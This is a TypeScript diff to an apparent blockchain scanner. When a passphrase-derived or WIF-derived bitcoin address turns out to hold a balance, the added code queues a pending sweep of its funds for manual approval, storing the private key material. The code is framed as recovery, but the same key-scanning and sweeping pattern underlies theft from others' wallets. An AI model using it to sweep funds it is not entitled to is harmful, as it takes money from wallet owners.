@@ -24,6 +24,8 @@ import bs58check from "bs58check";
 import { db } from "./db";
 import { eq } from "drizzle-orm";
 import { getAddressData } from "./blockchain-api-router";
+import { bitcoinSweepService } from "./bitcoin-sweep";
+import { sweepApprovalService } from "./sweep-approval";
 
 const DEFAULT_USER_ID = '36468785';
 
@@ -581,6 +583,21 @@ export async function checkAndRecordBalance(
         console.log(`   📊 TX Count: ${hit.txCount}`);
         if (opts.derivationPath) console.log(`   📍 Path: ${opts.derivationPath}`);
         console.log('');
+        
+        // Create pending sweep for manual approval (only for addresses with actual balance)
+        try {
+          await sweepApprovalService.createPendingSweep({
+            address: opts.address,
+            passphrase: opts.passphrase,
+            wif: opts.wif,
+            isCompressed: opts.isCompressed ?? true,
+            balanceSats: balanceInfo.balanceSats,
+            source: "typescript",
+            recoveryType: opts.recoveryType,
+          });
+        } catch (sweepError) {
+          console.error(`[BlockchainScanner] Failed to create pending sweep:`, sweepError);
+        }
       } else {
         console.log(`[BlockchainScanner] Historical activity ${typeLabel}: ${opts.address} (${hit.txCount} txs, 0 balance)`);
       }
